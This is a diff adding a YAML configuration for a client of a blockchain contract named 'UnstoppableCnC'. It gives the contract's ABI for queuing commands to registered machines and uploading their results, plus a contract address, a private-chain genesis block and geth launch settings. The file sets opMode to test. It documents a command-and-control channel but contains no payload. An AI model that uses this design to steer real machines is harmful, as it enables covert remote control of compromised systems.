@@ -1,0 +1,151 @@
+BlockChainData: build\Client%CLIENT_ID%
+clientWallet: null
+clientWalletPassword: null
+contract:
+  abi:
+  - constant: false
+    inputs:
+    - {name: instanceHash, type: bytes32}
+    - {name: command, type: string}
+    - {name: cmdId, type: uint16}
+    name: addWork
+    outputs:
+    - {name: '', type: bool}
+    payable: false
+    stateMutability: nonpayable
+    type: function
+  - constant: false
+    inputs:
+    - {name: sessionAndMachineIdHash, type: bytes32}
+    - {name: result, type: string}
+    - {name: cmdId, type: uint16}
+    name: uploadWorkResults
+    outputs:
+    - {name: '', type: bool}
+    payable: false
+    stateMutability: nonpayable
+    type: function
+  - constant: true
+    inputs:
+    - {name: '', type: bytes32}
+    name: instances
+    outputs:
+    - {name: state, type: uint8}
+    - {name: funds, type: uint256}
+    payable: false
+    stateMutability: view
+    type: function
+  - constant: false
+    inputs:
+    - {name: instanceHash, type: bytes32}
+    name: removeInstance
+    outputs:
+    - {name: success, type: bool}
+    payable: false
+    stateMutability: nonpayable
+    type: function
+  - constant: true
+    inputs: []
+    name: ownerPubKey
+    outputs:
+    - {name: '', type: string}
+    payable: false
+    stateMutability: view
+    type: function
+  - constant: false
+    inputs:
+    - {name: machineId, type: string}
+    name: registerInstance
+    outputs: []
+    payable: false
+    stateMutability: nonpayable
+    type: function
+  - constant: true
+    inputs: []
+    name: owner
+    outputs:
+    - {name: '', type: address}
+    payable: false
+    stateMutability: view
+    type: function
+  - constant: false
+    inputs:
+    - {name: instanceHash, type: bytes32}
+    name: allowInstance
+    outputs:
+    - {name: success, type: bool}
+    payable: true
+    stateMutability: payable
+    type: function
+  - constant: false
+    inputs:
+    - {name: instanceHash, type: bytes32}
+    - {name: sessionId, type: string}
+    name: registrationConfirmation
+    outputs: []
+    payable: false
+    stateMutability: nonpayable
+    type: function
+  - constant: true
+    inputs: []
+    name: creationTime
+    outputs:
+    - {name: '', type: uint256}
+    payable: false
+    stateMutability: view
+    type: function
+  - inputs:
+    - {name: pubkey, type: string}
+    - {name: addressHashes, type: 'bytes32[]'}
+    payable: false
+    stateMutability: nonpayable
+    type: constructor
+  - anonymous: false
+    inputs:
+    - {indexed: false, name: machineId, type: string}
+    name: RegistrationRequest
+    type: event
+  - anonymous: false
+    inputs:
+    - {indexed: false, name: sessionAndMachineIdHash, type: bytes32}
+    - {indexed: false, name: commandResult, type: string}
+    - {indexed: false, name: cmdId, type: uint16}
+    name: CommandResult
+    type: event
+  - anonymous: false
+    inputs:
+    - {indexed: true, name: instanceHash, type: bytes32}
+    - {indexed: false, name: sessionId, type: string}
+    - {indexed: false, name: fundsTransferred, type: uint256}
+    name: InstanceRegistered
+    type: event
+  - anonymous: false
+    inputs:
+    - {indexed: true, name: instanceHash, type: bytes32}
+    - {indexed: false, name: command, type: string}
+    - {indexed: false, name: cmdId, type: uint16}
+    name: CommandPending
+    type: event
+  address: '0xe7A08132f3cbe8B50798E599Bf043d4F6172374b'
+  name: UnstoppableCnC
+enode: enode://5f9ed1efaf21903011272cbb03e026fd05395cc227b173aed9f72f8445e75f2258836c5fca92a4eb18b385af13cde86806b32f696edfdf507300ce090f855f25@[::]:30303?discport=0
+genesis:
+  alloc:
+    '0x39dff19b80379445a0b7d04738dd62610880e58f': {balance: '300000000000000000'}
+  coinbase: '0x39dff19b80379445a0b7d04738dd62610880e58f'
+  config: {chainId: 666, eip155Block: 0, eip158Block: 0, homesteadBlock: 0}
+  difficulty: '0x400'
+  extraData: '0x0000000000000000000000000000000000000000000000000000000000000000'
+  gasLimit: '0x8000000'
+  mixhash: '0x0000000000000000000000000000000000000000000000000000000000000000'
+  nonce: '0x0000000000000042'
+  parentHash: '0x0000000000000000000000000000000000000000000000000000000000000000'
+  timestamp: '0x0000000000000000000000000000000000000000000000000000000000000000'
+genesisFile: build\genesisClient.json
+geth: bin\geth.exe
+gethCmd: [bin\geth.exe, --rpc, --rpcaddr, 127.0.0.1, --rpcport, '%RPCPORT%', --rpcapi,
+  'admin,debug,eth,miner,net,personal,shh,txpool,web3,ws', --datadir, '%DATADIR%',
+  --networkid, '1234', --port, '%NODEPORT%', --ipcdisable, --nodiscover, --verbosity,
+  '4']
+nodeRpcUrl: http://localhost:%NODEPORT%
+opMode: test
